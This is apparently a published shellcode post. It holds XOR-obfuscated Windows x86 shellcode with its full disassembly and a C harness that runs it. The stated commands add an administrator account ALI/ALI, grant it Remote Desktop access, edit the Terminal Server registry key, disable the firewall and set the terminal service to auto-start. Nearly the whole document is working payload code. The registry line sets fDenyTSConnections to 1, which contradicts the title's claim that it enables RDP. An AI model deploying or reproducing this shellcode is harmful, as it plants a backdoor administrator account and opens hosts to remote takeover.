#Author: Ali Razmjoo
​​#Title: ​Obfuscated Shellcode Windows x86 [1218 Bytes] [Add Administrator User/Pass ALI/ALI & Add ALI to RDP Group & Enable RDP From Registery & STOP Firewall & Auto Start terminal service]
	
Obfuscated Shellcode Windows x86 [1218 Bytes].c

/*
#Title: Obfuscated Shellcode Windows x86 [1218 Bytes] [Add Administrator User/Pass ALI/ALI & Add ALI to RDP Group & Enable RDP From Registery & STOP Firewall & Auto Start terminal service]
#length: 1218 bytes
#Date: 13 January 2015
#Author: Ali Razmjoo
#tested On: Windows 7 x86 ultimate

WinExec =>  0x7666e695
ExitProcess =>  0x76632acf
====================================
Execute :
net user ALI ALI /add
net localgroup Administrators ALI /add
NET LOCALGROUP "Remote Desktop Users" ALI /add  
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f 
netsh firewall set opmode disable
sc config termservice start= auto
====================================



Ali Razmjoo , ['Ali.Razmjoo1994@Gmail.Com','Ali@Z3r0D4y.Com']

Thanks to my friends , Dariush Nasirpour and Ehsan Nezami


C:\Users\Ali\Desktop>objdump -D shellcode.o

shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   b8 41 41 41 64          mov    $0x64414141,%eax
   8:   c1 e8 08                shr    $0x8,%eax
   b:   c1 e8 08                shr    $0x8,%eax
   e:   c1 e8 08                shr    $0x8,%eax
  11:   50                      push   %eax
  12:   b9 6d 76 53 52          mov    $0x5253766d,%ecx
  17:   ba 4d 59 32 36          mov    $0x3632594d,%edx
  1c:   31 d1                   xor    %edx,%ecx
  1e:   51                      push   %ecx
  1f:   b9 6e 72 61 71          mov    $0x7161726e,%ecx
  24:   ba 4e 33 2d 38          mov    $0x382d334e,%edx
  29:   31 d1                   xor    %edx,%ecx
  2b:   51                      push   %ecx
  2c:   b9 6c 75 78 78          mov    $0x7878756c,%ecx
  31:   ba 4c 34 34 31          mov    $0x3134344c,%edx
  36:   31 d1                   xor    %edx,%ecx
  38:   51                      push   %ecx
  39:   b9 46 47 57 46          mov    $0x46574746,%ecx
  3e:   ba 33 34 32 34          mov    $0x34323433,%edx
  43:   31 d1                   xor    %edx,%ecx
  45:   51                      push   %ecx
  46:   b9 56 50 47 64          mov    $0x64475056,%ecx
  4b:   ba 38 35 33 44          mov    $0x44333538,%edx
  50:   31 d1                   xor    %edx,%ecx
  52:   51                      push   %ecx
  53:   89 e0                   mov    %esp,%eax
  55:   bb 41 41 41 01          mov    $0x1414141,%ebx
  5a:   c1 eb 08                shr    $0x8,%ebx
  5d:   c1 eb 08                shr    $0x8,%ebx
  60:   c1 eb 08                shr    $0x8,%ebx
  63:   53                      push   %ebx
  64:   50                      push   %eax
  65:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
  6a:   ba 33 52 64 59          mov    $0x59645233,%edx
  6f:   31 d3                   xor    %edx,%ebx
  71:   ff d3                   call   *%ebx
  73:   31 c0                   xor    %eax,%eax
  75:   50                      push   %eax
  76:   68 41 41 64 64          push   $0x64644141
  7b:   58                      pop    %eax
  7c:   c1 e8 08                shr    $0x8,%eax
  7f:   c1 e8 08                shr    $0x8,%eax
  82:   50                      push   %eax
  83:   b9 01 41 60 32          mov    $0x32604101,%ecx
  88:   ba 48 61 4f 53          mov    $0x534f6148,%edx
  8d:   31 d1                   xor    %edx,%ecx
  8f:   51                      push   %ecx
  90:   b9 28 47 0d 2f          mov    $0x2f0d4728,%ecx
  95:   ba 5b 67 4c 63          mov    $0x634c675b,%edx
  9a:   31 d1                   xor    %edx,%ecx
  9c:   51                      push   %ecx
  9d:   b9 03 24 36 21          mov    $0x21362403,%ecx
  a2:   ba 62 50 59 53          mov    $0x53595062,%edx
  a7:   31 d1                   xor    %edx,%ecx
  a9:   51                      push   %ecx
  aa:   b9 34 41 15 18          mov    $0x18154134,%ecx
  af:   ba 5d 32 61 6a          mov    $0x6a61325d,%edx
  b4:   31 d1                   xor    %edx,%ecx
  b6:   51                      push   %ecx
  b7:   b9 0c 05 1b 25          mov    $0x251b050c,%ecx
  bc:   ba 68 68 72 4b          mov    $0x4b726868,%edx
  c1:   31 d1                   xor    %edx,%ecx
  c3:   51                      push   %ecx
  c4:   b9 2f 27 7b 13          mov    $0x137b272f,%ecx
  c9:   ba 5a 57 5b 52          mov    $0x525b575a,%edx
  ce:   31 d1                   xor    %edx,%ecx
  d0:   51                      push   %ecx
  d1:   b9 1c 2c 02 3e          mov    $0x3e022c1c,%ecx
  d6:   ba 70 4b 70 51          mov    $0x51704b70,%edx
  db:   31 d1                   xor    %edx,%ecx
  dd:   51                      push   %ecx
  de:   b9 3d 2a 32 4c          mov    $0x4c322a3d,%ecx
  e3:   ba 51 45 51 2d          mov    $0x2d514551,%edx
  e8:   31 d1                   xor    %edx,%ecx
  ea:   51                      push   %ecx
  eb:   b9 23 5c 1c 19          mov    $0x191c5c23,%ecx
  f0:   ba 4d 39 68 39          mov    $0x3968394d,%edx
  f5:   31 d1                   xor    %edx,%ecx
  f7:   51                      push   %ecx
  f8:   89 e0                   mov    %esp,%eax
  fa:   bb 41 41 41 01          mov    $0x1414141,%ebx
  ff:   c1 eb 08                shr    $0x8,%ebx
 102:   c1 eb 08                shr    $0x8,%ebx
 105:   c1 eb 08                shr    $0x8,%ebx
 108:   53                      push   %ebx
 109:   50                      push   %eax
 10a:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
 10f:   ba 33 52 64 59          mov    $0x59645233,%edx
 114:   31 d3                   xor    %edx,%ebx
 116:   ff d3                   call   *%ebx
 118:   31 c0                   xor    %eax,%eax
 11a:   50                      push   %eax
 11b:   68 41 41 64 64          push   $0x64644141
 120:   58                      pop    %eax
 121:   c1 e8 08                shr    $0x8,%eax
 124:   c1 e8 08                shr    $0x8,%eax
 127:   50                      push   %eax
 128:   b9 02 63 6b 35          mov    $0x356b6302,%ecx
 12d:   ba 4b 43 44 54          mov    $0x5444434b,%edx
 132:   31 d1                   xor    %edx,%ecx
 134:   51                      push   %ecx
 135:   b9 61 55 6c 3d          mov    $0x3d6c5561,%ecx
 13a:   ba 43 75 2d 71          mov    $0x712d7543,%edx
 13f:   31 d1                   xor    %edx,%ecx
 141:   51                      push   %ecx
 142:   b9 27 3f 3b 1a          mov    $0x1a3b3f27,%ecx
 147:   ba 54 5a 49 69          mov    $0x69495a54,%edx
 14c:   31 d1                   xor    %edx,%ecx
 14e:   51                      push   %ecx
 14f:   b9 25 34 12 67          mov    $0x67123425,%ecx
 154:   ba 4a 44 32 32          mov    $0x3232444a,%edx
 159:   31 d1                   xor    %edx,%ecx
 15b:   51                      push   %ecx
 15c:   b9 0b 02 1f 19          mov    $0x191f020b,%ecx
 161:   ba 6e 71 74 6d          mov    $0x6d74716e,%edx
 166:   31 d1                   xor    %edx,%ecx
 168:   51                      push   %ecx
 169:   b9 39 3f 7b 15          mov    $0x157b3f39,%ecx
 16e:   ba 4d 5a 5b 51          mov    $0x515b5a4d,%edx
 173:   31 d1                   xor    %edx,%ecx
 175:   51                      push   %ecx
 176:   b9 35 15 03 2a          mov    $0x2a031535,%ecx
 17b:   ba 67 70 6e 45          mov    $0x456e7067,%edx
 180:   31 d1                   xor    %edx,%ecx
 182:   51                      push   %ecx
 183:   b9 3a 17 75 46          mov    $0x4675173a,%ecx
 188:   ba 6f 47 55 64          mov    $0x6455476f,%edx
 18d:   31 d1                   xor    %edx,%ecx
 18f:   51                      push   %ecx
 190:   b9 26 35 0b 1e          mov    $0x1e0b3526,%ecx
 195:   ba 6a 72 59 51          mov    $0x5159726a,%edx
 19a:   31 d1                   xor    %edx,%ecx
 19c:   51                      push   %ecx
 19d:   b9 2a 2a 06 2a          mov    $0x2a062a2a,%ecx
 1a2:   ba 66 65 45 6b          mov    $0x6b456566,%edx
 1a7:   31 d1                   xor    %edx,%ecx
 1a9:   51                      push   %ecx
 1aa:   b9 1d 20 35 5a          mov    $0x5a35201d,%ecx
 1af:   ba 53 65 61 7a          mov    $0x7a616553,%edx
 1b4:   31 d1                   xor    %edx,%ecx
 1b6:   51                      push   %ecx
 1b7:   89 e0                   mov    %esp,%eax
 1b9:   bb 41 41 41 01          mov    $0x1414141,%ebx
 1be:   c1 eb 08                shr    $0x8,%ebx
 1c1:   c1 eb 08                shr    $0x8,%ebx
 1c4:   c1 eb 08                shr    $0x8,%ebx
 1c7:   53                      push   %ebx
 1c8:   50                      push   %eax
 1c9:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
 1ce:   ba 33 52 64 59          mov    $0x59645233,%edx
 1d3:   31 d3                   xor    %edx,%ebx
 1d5:   ff d3                   call   *%ebx
 1d7:   31 c0                   xor    %eax,%eax
 1d9:   50                      push   %eax
 1da:   b9 09 4c 7c 5e          mov    $0x5e7c4c09,%ecx
 1df:   ba 38 6c 53 38          mov    $0x38536c38,%edx
 1e4:   31 d1                   xor    %edx,%ecx
 1e6:   51                      push   %ecx
 1e7:   b9 42 4d 39 14          mov    $0x14394d42,%ecx
 1ec:   ba 62 62 5d 34          mov    $0x345d6262,%edx
 1f1:   31 d1                   xor    %edx,%ecx
 1f3:   51                      push   %ecx
 1f4:   b9 7a 24 26 75          mov    $0x7526247a,%ecx
 1f9:   ba 2d 6b 74 31          mov    $0x31746b2d,%edx
 1fe:   31 d1                   xor    %edx,%ecx
 200:   51                      push   %ecx
 201:   b9 1d 30 15 28          mov    $0x2815301d,%ecx
 206:   ba 58 77 4a 6c          mov    $0x6c4a7758,%edx
 20b:   31 d1                   xor    %edx,%ecx
 20d:   51                      push   %ecx
 20e:   b9 7c 2f 57 16          mov    $0x16572f7c,%ecx
 213:   ba 53 5b 77 44          mov    $0x44775b53,%edx
 218:   31 d1                   xor    %edx,%ecx
 21a:   51                      push   %ecx
 21b:   b9 42 25 2a 66          mov    $0x662a2542,%ecx
 220:   ba 2d 4b 59 46          mov    $0x46594b2d,%edx
 225:   31 d1                   xor    %edx,%ecx
 227:   51                      push   %ecx
 228:   b9 28 2f 0c 5a          mov    $0x5a0c2f28,%ecx
 22d:   ba 4d 4c 78 33          mov    $0x33784c4d,%edx
 232:   31 d1                   xor    %edx,%ecx
 234:   51                      push   %ecx
 235:   b9 20 2b 26 26          mov    $0x26262b20,%ecx
 23a:   ba 63 44 48 48          mov    $0x48484463,%edx
 23f:   31 d1                   xor    %edx,%ecx
 241:   51                      push   %ecx
 242:   b9 08 2b 23 67          mov    $0x67232b08,%ecx
 247:   ba 66 52 77 34          mov    $0x34775266,%edx
 24c:   31 d1                   xor    %edx,%ecx
 24e:   51                      push   %ecx
 24f:   b9 49 1c 2e 48          mov    $0x482e1c49,%ecx
 254:   ba 69 7a 6a 2d          mov    $0x2d6a7a69,%edx
 259:   31 d1                   xor    %edx,%ecx
 25b:   51                      push   %ecx
 25c:   b9 67 67 1d 37          mov    $0x371d6767,%ecx
 261:   ba 45 47 32 41          mov    $0x41324745,%edx
 266:   31 d1                   xor    %edx,%ecx
 268:   51                      push   %ecx
 269:   b9 03 33 0d 3b          mov    $0x3b0d3303,%ecx
 26e:   ba 71 45 68 49          mov    $0x49684571,%edx
 273:   31 d1                   xor    %edx,%ecx
 275:   51                      push   %ecx
 276:   b9 39 6a 3c 2f          mov    $0x2f3c6a39,%ecx
 27b:   ba 55 4a 6f 4a          mov    $0x4a6f4a55,%edx
 280:   31 d1                   xor    %edx,%ecx
 282:   51                      push   %ecx
 283:   b9 37 44 1f 2e          mov    $0x2e1f4437,%ecx
 288:   ba 5a 2d 71 4f          mov    $0x4f712d5a,%edx
 28d:   31 d1                   xor    %edx,%ecx
 28f:   51                      push   %ecx
 290:   b9 34 23 23 3b          mov    $0x3b232334,%ecx
 295:   ba 68 77 46 49          mov    $0x49467768,%edx
 29a:   31 d1                   xor    %edx,%ecx
 29c:   51                      push   %ecx
 29d:   b9 07 3a 0a 14          mov    $0x140a3a07,%ecx
 2a2:   ba 73 48 65 78          mov    $0x78654873,%edx
 2a7:   31 d1                   xor    %edx,%ecx
 2a9:   51                      push   %ecx
 2aa:   b9 14 2e 58 53          mov    $0x53582e14,%ecx
 2af:   ba 48 6d 37 3d          mov    $0x3d376d48,%edx
 2b4:   31 d1                   xor    %edx,%ecx
 2b6:   51                      push   %ecx
 2b7:   b9 3e 3d 26 32          mov    $0x32263d3e,%ecx
 2bc:   ba 52 6e 43 46          mov    $0x46436e52,%edx
 2c1:   31 d1                   xor    %edx,%ecx
 2c3:   51                      push   %ecx
 2c4:   b9 33 3c 35 34          mov    $0x34353c33,%ecx
 2c9:   ba 5d 48 47 5b          mov    $0x5b47485d,%edx
 2ce:   31 d1                   xor    %edx,%ecx
 2d0:   51                      push   %ecx
 2d1:   b9 36 0e 07 2b          mov    $0x2b070e36,%ecx
 2d6:   ba 58 7a 44 44          mov    $0x44447a58,%edx
 2db:   31 d1                   xor    %edx,%ecx
 2dd:   51                      push   %ecx
 2de:   b9 3c 10 0a 37          mov    $0x370a103c,%ecx
 2e3:   ba 49 62 78 52          mov    $0x52786249,%edx
 2e8:   31 d1                   xor    %edx,%ecx
 2ea:   51                      push   %ecx
 2eb:   b9 24 7c 3b 36          mov    $0x363b7c24,%ecx
 2f0:   ba 61 31 67 75          mov    $0x75673161,%edx
 2f5:   31 d1                   xor    %edx,%ecx
 2f7:   51                      push   %ecx
 2f8:   b9 31 3d 3b 27          mov    $0x273b3d31,%ecx
 2fd:   ba 62 64 68 73          mov    $0x73686462,%edx
 302:   31 d1                   xor    %edx,%ecx
 304:   51                      push   %ecx
 305:   b9 7f 7d 3d 35          mov    $0x353d7d7f,%ecx
 30a:   ba 36 33 78 69          mov    $0x69783336,%edx
 30f:   31 d1                   xor    %edx,%ecx
 311:   51                      push   %ecx
 312:   b9 7c 13 0f 2f          mov    $0x2f0f137c,%ecx
 317:   ba 31 52 4c 67          mov    $0x674c5231,%edx
 31c:   31 d1                   xor    %edx,%ecx
 31e:   51                      push   %ecx
 31f:   b9 1b 08 35 2d          mov    $0x2d35081b,%ecx
 324:   ba 58 49 79 72          mov    $0x72794958,%edx
 329:   31 d1                   xor    %edx,%ecx
 32b:   51                      push   %ecx
 32c:   b9 74 3a 1e 21          mov    $0x211e3a74,%ecx
 331:   ba 2d 65 52 6e          mov    $0x6e52652d,%edx
 336:   31 d1                   xor    %edx,%ecx
 338:   51                      push   %ecx
 339:   b9 16 10 1f 17          mov    $0x171f1016,%ecx
 33e:   ba 34 58 54 52          mov    $0x52545834,%edx
 343:   31 d1                   xor    %edx,%ecx
 345:   51                      push   %ecx
 346:   b9 2f 27 0c 6e          mov    $0x6e0c272f,%ecx
 34b:   ba 4e 43 68 4e          mov    $0x4e68434e,%edx
 350:   31 d1                   xor    %edx,%ecx
 352:   51                      push   %ecx
 353:   b9 39 22 5e 50          mov    $0x505e2239,%ecx
 358:   ba 4b 47 39 70          mov    $0x7039474b,%edx
 35d:   31 d1                   xor    %edx,%ecx
 35f:   51                      push   %ecx
 360:   89 e0                   mov    %esp,%eax
 362:   bb 41 41 41 01          mov    $0x1414141,%ebx
 367:   c1 eb 08                shr    $0x8,%ebx
 36a:   c1 eb 08                shr    $0x8,%ebx
 36d:   c1 eb 08                shr    $0x8,%ebx
 370:   53                      push   %ebx
 371:   50                      push   %eax
 372:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
 377:   ba 33 52 64 59          mov    $0x59645233,%edx
 37c:   31 d3                   xor    %edx,%ebx
 37e:   ff d3                   call   *%ebx
 380:   31 c0                   xor    %eax,%eax
 382:   50                      push   %eax
 383:   b8 41 41 41 65          mov    $0x65414141,%eax
 388:   c1 e8 08                shr    $0x8,%eax
 38b:   c1 e8 08                shr    $0x8,%eax
 38e:   c1 e8 08                shr    $0x8,%eax
 391:   50                      push   %eax
 392:   b9 1e 53 39 3c          mov    $0x3c39531e,%ecx
 397:   ba 6d 32 5b 50          mov    $0x505b326d,%edx
 39c:   31 d1                   xor    %edx,%ecx
 39e:   51                      push   %ecx
 39f:   b9 04 66 2f 32          mov    $0x322f6604,%ecx
 3a4:   ba 61 46 4b 5b          mov    $0x5b4b4661,%edx
 3a9:   31 d1                   xor    %edx,%ecx
 3ab:   51                      push   %ecx
 3ac:   b9 19 1e 0d 11          mov    $0x110d1e19,%ecx
 3b1:   ba 69 73 62 75          mov    $0x75627369,%edx
 3b6:   31 d1                   xor    %edx,%ecx
 3b8:   51                      push   %ecx
 3b9:   b9 20 41 47 36          mov    $0x36474120,%ecx
 3be:   ba 45 35 67 59          mov    $0x59673545,%edx
 3c3:   31 d1                   xor    %edx,%ecx
 3c5:   51                      push   %ecx
 3c6:   b9 2b 05 64 2a          mov    $0x2a64052b,%ecx
 3cb:   ba 47 69 44 59          mov    $0x59446947,%edx
 3d0:   31 d1                   xor    %edx,%ecx
 3d2:   51                      push   %ecx
 3d3:   b9 10 3f 4f 22          mov    $0x224f3f10,%ecx
 3d8:   ba 62 5a 38 43          mov    $0x43385a62,%edx
 3dd:   31 d1                   xor    %edx,%ecx
 3df:   51                      push   %ecx
 3e0:   b9 2a 6f 2a 24          mov    $0x242a6f2a,%ecx
 3e5:   ba 42 4f 4c 4d          mov    $0x4d4c4f42,%edx
 3ea:   31 d1                   xor    %edx,%ecx
 3ec:   51                      push   %ecx
 3ed:   b9 29 09 1e 5e          mov    $0x5e1e0929,%ecx
 3f2:   ba 47 6c 6a 2d          mov    $0x2d6a6c47,%edx
 3f7:   31 d1                   xor    %edx,%ecx
 3f9:   51                      push   %ecx
 3fa:   89 e0                   mov    %esp,%eax
 3fc:   bb 41 41 41 01          mov    $0x1414141,%ebx
 401:   c1 eb 08                shr    $0x8,%ebx
 404:   c1 eb 08                shr    $0x8,%ebx
 407:   c1 eb 08                shr    $0x8,%ebx
 40a:   53                      push   %ebx
 40b:   50                      push   %eax
 40c:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
 411:   ba 33 52 64 59          mov    $0x59645233,%edx
 416:   31 d3                   xor    %edx,%ebx
 418:   ff d3                   call   *%ebx
 41a:   31 c0                   xor    %eax,%eax
 41c:   50                      push   %eax
 41d:   b8 41 41 41 6f          mov    $0x6f414141,%eax
 422:   c1 e8 08                shr    $0x8,%eax
 425:   c1 e8 08                shr    $0x8,%eax
 428:   c1 e8 08                shr    $0x8,%eax
 42b:   50                      push   %eax
 42c:   b9 72 2a 05 39          mov    $0x39052a72,%ecx
 431:   ba 52 4b 70 4d          mov    $0x4d704b52,%edx
 436:   31 d1                   xor    %edx,%ecx
 438:   51                      push   %ecx
 439:   b9 54 3a 05 52          mov    $0x52053a54,%ecx
 43e:   ba 35 48 71 6f          mov    $0x6f714835,%edx
 443:   31 d1                   xor    %edx,%ecx
 445:   51                      push   %ecx
 446:   b9 29 16 0a 47          mov    $0x470a1629,%ecx
 44b:   ba 4c 36 79 33          mov    $0x3379364c,%edx
 450:   31 d1                   xor    %edx,%ecx
 452:   51                      push   %ecx
 453:   b9 27 1b 5b 3e          mov    $0x3e5b1b27,%ecx
 458:   ba 55 6d 32 5d          mov    $0x5d326d55,%edx
 45d:   31 d1                   xor    %edx,%ecx
 45f:   51                      push   %ecx
 460:   b9 33 1a 3b 10          mov    $0x103b1a33,%ecx
 465:   ba 41 77 48 75          mov    $0x75487741,%edx
 46a:   31 d1                   xor    %edx,%ecx
 46c:   51                      push   %ecx
 46d:   b9 34 79 3a 12          mov    $0x123a7934,%ecx
 472:   ba 53 59 4e 77          mov    $0x774e5953,%edx
 477:   31 d1                   xor    %edx,%ecx
 479:   51                      push   %ecx
 47a:   b9 1d 5c 1e 28          mov    $0x281e5c1d,%ecx
 47f:   ba 72 32 78 41          mov    $0x41783272,%edx
 484:   31 d1                   xor    %edx,%ecx
 486:   51                      push   %ecx
 487:   b9 2a 4e 5a 28          mov    $0x285a4e2a,%ecx
 48c:   ba 59 2d 7a 4b          mov    $0x4b7a2d59,%edx
 491:   31 d1                   xor    %edx,%ecx
 493:   51                      push   %ecx
 494:   89 e0                   mov    %esp,%eax
 496:   bb 41 41 41 01          mov    $0x1414141,%ebx
 49b:   c1 eb 08                shr    $0x8,%ebx
 49e:   c1 eb 08                shr    $0x8,%ebx
 4a1:   c1 eb 08                shr    $0x8,%ebx
 4a4:   53                      push   %ebx
 4a5:   50                      push   %eax
 4a6:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx
 4ab:   ba 33 52 64 59          mov    $0x59645233,%edx
 4b0:   31 d3                   xor    %edx,%ebx
 4b2:   ff d3                   call   *%ebx
 4b4:   bb f9 7e 5e 22          mov    $0x225e7ef9,%ebx
 4b9:   ba 36 54 3d 54          mov    $0x543d5436,%edx
 4be:   31 d3                   xor    %edx,%ebx
 4c0:   ff d3                   call   *%ebx
 
 
*/
 
#include <stdio.h>
#include <string.h>
 
int main(){
unsigned char shellcode[]= "\x31\xc0\x50\xb8\x41\x41\x41\x64\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x6d\x76\x53\x52\xba\x4d\x59\x32\x36\x31\xd1\x51\xb9\x6e\x72\x61\x71\xba\x4e\x33\x2d\x38\x31\xd1\x51\xb9\x6c\x75\x78\x78\xba\x4c\x34\x34\x31\x31\xd1\x51\xb9\x46\x47\x57\x46\xba\x33\x34\x32\x34\x31\xd1\x51\xb9\x56\x50\x47\x64\xba\x38\x35\x33\x44\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\x68\x41\x41\x64\x64\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x01\x41\x60\x32\xba\x48\x61\x4f\x53\x31\xd1\x51\xb9\x28\x47\x0d\x2f\xba\x5b\x67\x4c\x63\x31\xd1\x51\xb9\x03\x24\x36\x21\xba\x62\x50\x59\x53\x31\xd1\x51\xb9\x34\x41\x15\x18\xba\x5d\x32\x61\x6a\x31\xd1\x51\xb9\x0c\x05\x1b\x25\xba\x68\x68\x72\x4b\x31\xd1\x51\xb9\x2f\x27\x7b\x13\xba\x5a\x57\x5b\x52\x31\xd1\x51\xb9\x1c\x2c\x02\x3e\xba\x70\x4b\x70\x51\x31\xd1\x51\xb9\x3d\x2a\x32\x4c\xba\x51\x45\x51\x2d\x31\xd1\x51\xb9\x23\x5c\x1c\x19\xba\x4d\x39\x68\x39\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\x68\x41\x41\x64\x64\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x02\x63\x6b\x35\xba\x4b\x43\x44\x54\x31\xd1\x51\xb9\x61\x55\x6c\x3d\xba\x43\x75\x2d\x71\x31\xd1\x51\xb9\x27\x3f\x3b\x1a\xba\x54\x5a\x49\x69\x31\xd1\x51\xb9\x25\x34\x12\x67\xba\x4a\x44\x32\x32\x31\xd1\x51\xb9\x0b\x02\x1f\x19\xba\x6e\x71\x74\x6d\x31\xd1\x51\xb9\x39\x3f\x7b\x15\xba\x4d\x5a\x5b\x51\x31\xd1\x51\xb9\x35\x15\x03\x2a\xba\x67\x70\x6e\x45\x31\xd1\x51\xb9\x3a\x17\x75\x46\xba\x6f\x47\x55\x64\x31\xd1\x51\xb9\x26\x35\x0b\x1e\xba\x6a\x72\x59\x51\x31\xd1\x51\xb9\x2a\x2a\x06\x2a\xba\x66\x65\x45\x6b\x31\xd1\x51\xb9\x1d\x20\x35\x5a\xba\x53\x65\x61\x7a\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\xb9\x09\x4c\x7c\x5e\xba\x38\x6c\x53\x38\x31\xd1\x51\xb9\x42\x4d\x39\x14\xba\x62\x62\x5d\x34\x31\xd1\x51\xb9\x7a\x24\x26\x75\xba\x2d\x6b\x74\x31\x31\xd1\x51\xb9\x1d\x30\x15\x28\xba\x58\x77\x4a\x6c\x31\xd1\x51\xb9\x7c\x2f\x57\x16\xba\x53\x5b\x77\x44\x31\xd1\x51\xb9\x42\x25\x2a\x66\xba\x2d\x4b\x59\x46\x31\xd1\x51\xb9\x28\x2f\x0c\x5a\xba\x4d\x4c\x78\x33\x31\xd1\x51\xb9\x20\x2b\x26\x26\xba\x63\x44\x48\x48\x31\xd1\x51\xb9\x08\x2b\x23\x67\xba\x66\x52\x77\x34\x31\xd1\x51\xb9\x49\x1c\x2e\x48\xba\x69\x7a\x6a\x2d\x31\xd1\x51\xb9\x67\x67\x1d\x37\xba\x45\x47\x32\x41\x31\xd1\x51\xb9\x03\x33\x0d\x3b\xba\x71\x45\x68\x49\x31\xd1\x51\xb9\x39\x6a\x3c\x2f\xba\x55\x4a\x6f\x4a\x31\xd1\x51\xb9\x37\x44\x1f\x2e\xba\x5a\x2d\x71\x4f\x31\xd1\x51\xb9\x34\x23\x23\x3b\xba\x68\x77\x46\x49\x31\xd1\x51\xb9\x07\x3a\x0a\x14\xba\x73\x48\x65\x78\x31\xd1\x51\xb9\x14\x2e\x58\x53\xba\x48\x6d\x37\x3d\x31\xd1\x51\xb9\x3e\x3d\x26\x32\xba\x52\x6e\x43\x46\x31\xd1\x51\xb9\x33\x3c\x35\x34\xba\x5d\x48\x47\x5b\x31\xd1\x51\xb9\x36\x0e\x07\x2b\xba\x58\x7a\x44\x44\x31\xd1\x51\xb9\x3c\x10\x0a\x37\xba\x49\x62\x78\x52\x31\xd1\x51\xb9\x24\x7c\x3b\x36\xba\x61\x31\x67\x75\x31\xd1\x51\xb9\x31\x3d\x3b\x27\xba\x62\x64\x68\x73\x31\xd1\x51\xb9\x7f\x7d\x3d\x35\xba\x36\x33\x78\x69\x31\xd1\x51\xb9\x7c\x13\x0f\x2f\xba\x31\x52\x4c\x67\x31\xd1\x51\xb9\x1b\x08\x35\x2d\xba\x58\x49\x79\x72\x31\xd1\x51\xb9\x74\x3a\x1e\x21\xba\x2d\x65\x52\x6e\x31\xd1\x51\xb9\x16\x10\x1f\x17\xba\x34\x58\x54\x52\x31\xd1\x51\xb9\x2f\x27\x0c\x6e\xba\x4e\x43\x68\x4e\x31\xd1\x51\xb9\x39\x22\x5e\x50\xba\x4b\x47\x39\x70\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\xb8\x41\x41\x41\x65\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x1e\x53\x39\x3c\xba\x6d\x32\x5b\x50\x31\xd1\x51\xb9\x04\x66\x2f\x32\xba\x61\x46\x4b\x5b\x31\xd1\x51\xb9\x19\x1e\x0d\x11\xba\x69\x73\x62\x75\x31\xd1\x51\xb9\x20\x41\x47\x36\xba\x45\x35\x67\x59\x31\xd1\x51\xb9\x2b\x05\x64\x2a\xba\x47\x69\x44\x59\x31\xd1\x51\xb9\x10\x3f\x4f\x22\xba\x62\x5a\x38\x43\x31\xd1\x51\xb9\x2a\x6f\x2a\x24\xba\x42\x4f\x4c\x4d\x31\xd1\x51\xb9\x29\x09\x1e\x5e\xba\x47\x6c\x6a\x2d\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\x31\xc0\x50\xb8\x41\x41\x41\x6f\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x72\x2a\x05\x39\xba\x52\x4b\x70\x4d\x31\xd1\x51\xb9\x54\x3a\x05\x52\xba\x35\x48\x71\x6f\x31\xd1\x51\xb9\x29\x16\x0a\x47\xba\x4c\x36\x79\x33\x31\xd1\x51\xb9\x27\x1b\x5b\x3e\xba\x55\x6d\x32\x5d\x31\xd1\x51\xb9\x33\x1a\x3b\x10\xba\x41\x77\x48\x75\x31\xd1\x51\xb9\x34\x79\x3a\x12\xba\x53\x59\x4e\x77\x31\xd1\x51\xb9\x1d\x5c\x1e\x28\xba\x72\x32\x78\x41\x31\xd1\x51\xb9\x2a\x4e\x5a\x28\xba\x59\x2d\x7a\x4b\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xa6\xb4\x02\x2f\xba\x33\x52\x64\x59\x31\xd3\xff\xd3\xbb\xf9\x7e\x5e\x22\xba\x36\x54\x3d\x54\x31\xd3\xff\xd3";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}